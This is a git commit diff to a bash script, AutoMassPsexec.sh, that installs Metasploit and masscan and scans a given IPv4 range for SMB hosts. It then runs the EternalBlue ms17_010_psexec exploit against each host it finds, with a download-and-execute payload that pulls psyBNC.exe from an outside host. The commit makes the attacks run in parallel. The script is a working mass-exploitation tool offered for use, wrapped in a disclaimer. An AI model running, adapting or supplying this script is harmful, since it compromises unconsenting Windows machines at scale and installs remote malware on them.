ee69e81fd159826eab559d094d9f42a927d8c9d8
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-02 21:34:02 -0400

    Update AutoMassPsexec.sh

--- AutoMassPsexec.sh
+++ AutoMassPsexec.sh
@@ -7,7 +7,7 @@ echo LinkedIn: https://rebrand.ly/1091c;
 echo ---DISCLAIMER--- I AM NOT RESPONSIBLE FOR ANY ACTIONS YOU MAKE WITH THIS PROGRAM. THE ONLY RESPONSIBLE PERSON IS YOU!;
 sleep 5s;
 echo Installing necessary files to run this nasty script.;
-sudo apt update && sudo apt install git metasploit-framework libssl-dev -y;
+sudo apt update && sudo apt install git metasploit-framework libssl-dev libpcap-dev -y;
 service postgresql start;
 msfdb init;
 git clone https://github.com/robertdavidgraham/masscan.git;
@@ -24,5 +24,6 @@ sleep 1s;
 echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
 sleep 1m;
 echo Starting attack on IPv4 range $1 ... This will take a while.;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" &
+done
 echo !!!THE END OF THE WORLD!!!;
